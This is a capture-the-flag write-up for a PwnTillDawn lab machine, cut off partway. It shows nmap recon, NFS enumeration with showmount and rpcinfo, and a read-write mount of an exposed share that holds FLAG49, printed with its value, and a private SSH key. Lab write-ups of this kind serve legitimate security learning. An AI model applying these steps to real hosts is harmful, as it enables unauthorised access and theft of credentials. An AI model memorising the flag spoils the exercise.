**Ressources**
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind
- https://gabb4r.gitbook.io/oscp-notes/service-enumeration/nfs-enumeration-port-111-2049
- https://medium.com/@minimalist.ascent/pentesting-nfs-servers-a22090e1ec09
## Recon
```
└─# nmap -sS -vvv -A --min-rate 5000  10.150.150.134
Not shown: 703 filtered tcp ports (no-response), 295 closed tcp ports (reset)
PORT    STATE SERVICE    REASON         VERSION
22/tcp  open  tcpwrapped syn-ack ttl 63
| ssh-hostkey: 
|   1024 f6e93fcf88ec7c35639134aa145549cc (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJeSzHxs9effBDGXOO7YKNL6qFLAq08KPqP6W3U2PUc5itfhFwHQF5Fkm1rh+1eJtkIsQwcnep948JwR2ERdadr2UjUVbHsQyVUCoYu60uvhecX5d/2xJH7w2rICOWrFgfspVU7/gAdytXZYt6+9gTrpUFAsrzRl8SYk8oyIzp27AAAAFQD7JzAjZAXbYO2teX/xRRFo+suWjQAAAIBJouPtQlnvPpk5jeTkEph+7tb6XlVeOcRJWqlk0qA4LmDA6nDkgQeQYXtj2tuCHs35SGvgJAPf5YCzgQSEJfkStIwFNnEjoLcDmcyFusH48LhBprHyupdPHJ2oIZiGzJ5gRcO6MBIrD515lBUU0mM4d/EDUc5cgK04ju/KOU8vBgAAAIB5Ibff0Vn6m4qW4UuHR5DJXNJK1qULPOuh0F+aM2Us6k2jyVjvKpgHdrFT9htJuPJYKXWzqPLAiuKphxsUIIPQjd6oBc0NLIXlPwCIMg3uAaEDj4F5EmdbtXDKP8TOtsdOrLErBVVI6Lqhj/dF05jgxgs8z/AR+cGMJfo0q3GakQ==
|   2048 201de9906f4b82a3711ea999957f31ea (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA1vYqn6ShiWsNsD7dqHVGkVcbMl0uKwtjvQRMemx8yVWSkMel3bVKOsAJx+nGDK+9u1ZnhRU3m0t8FlaSPy5Z31BayoNU4U8QxnFsbgnPaYoGqXr9oIhRyoDagXJ/rl6NeAmErwaRcRwFXCSbSVzG1OOYt3fLL8qIklM8Lcbeo8lsJh97AWKfUj1z349v4nGnaBkFG6C4rFlefLvuV+tbq7oyq4Ucce2xDOXiPpRfpKpiLOepzQlJ4kkiYZOhwMiA+3hOm2ZnAOXHsFwb+kYBvcL0sdkLHJ79e8XH/HhugLQQu/07mYEdbgIJN+fxSgFCCkfBE6QBBXBpnyYBNUEK9Q==
111/tcp open  tcpwrapped syn-ack ttl 63
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      34154/tcp   mountd
|   100005  1,2,3      50354/udp   mountd
|   100021  1,3,4      45783/tcp   nlockmgr
|   100021  1,3,4      48262/udp   nlockmgr
|   100024  1          38840/udp   status
|_  100024  1          40110/tcp   status
OS fingerprint not ideal because: maxTimingRatio (1.726000e+00) is greater than 1.4
Aggressive OS guesses: Thecus 4200 or N5500 NAS device (Linux 2.6.33) (96%), DD-WRT v23 - v24-sp2 (Linux 2.4.20 - 2.4.37) (95%), Sveasoft (Linux 2.4.20) (95%), Linux 2.6.16 - 2.6.35 (embedded) (95%), Linux 2.6.17 - 2.6.36 (95%), Linux 2.6.19 - 2.6.36 (95%), Linux 2.6.24 - 2.6.36 (95%), Linux 2.6.30 (95%), Linux 2.6.32 (95%), Linux 2.6.34 (95%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
```
Humm, here i found something very important, a `nfs` mount share on port 111.
I verified it using the `showmount` command
```
└─# showmount -e 10.150.150.134 
Export list for 10.150.150.134:
/srv/exportnfs 10.0.0.0/8
```
or this 
```
┌──(root㉿1337)-[/home/bloman/CTFs/Boot2root/PwntillDawn]
└─# rpcinfo -p 10.150.150.134
   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  38840  status
    100024    1   tcp  40110  status
    100021    1   udp  48262  nlockmgr
    100021    3   udp  48262  nlockmgr
    100021    4   udp  48262  nlockmgr
    100021    1   tcp  45783  nlockmgr
    100021    3   tcp  45783  nlockmgr
    100021    4   tcp  45783  nlockmgr
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100005    1   udp  50354  mountd
    100005    1   tcp  34154  mountd
    100005    2   udp  50354  mountd
    100005    2   tcp  34154  mountd
    100005    3   udp  50354  mountd
    100005    3   tcp  34154  mountd
```
Now i will create a directory and then mount the filesystem
```
└─# mount -o rw,vers=3 10.150.150.134:/srv/exportnfs nfs
Created symlink /run/systemd/system/remote-fs.target.wants/rpc-statd.service → /lib/systemd/system/rpc-statd.service.
```
Mounted

```
┌──(root㉿1337)-[/home/bloman/CTFs/Boot2root/PwntillDawn]
└─# file nfs                
nfs: directory
                                                                                                                                     
┌──(root㉿1337)-[/home/bloman/CTFs/Boot2root/PwntillDawn]
└─# cd nfs   
                                                                                                                                     
┌──(root㉿1337)-[/home/…/CTFs/Boot2root/PwntillDawn/nfs]
└─# ls
FLAG49  id_rsa  id_rsa.pub
FLAG49: 41b779ac4c999468ba7f862cde86412096d1c37b                 

```
## FootHold
in the id_rsa.pub i found `deadbeef@ubuntu` the owner name
```



```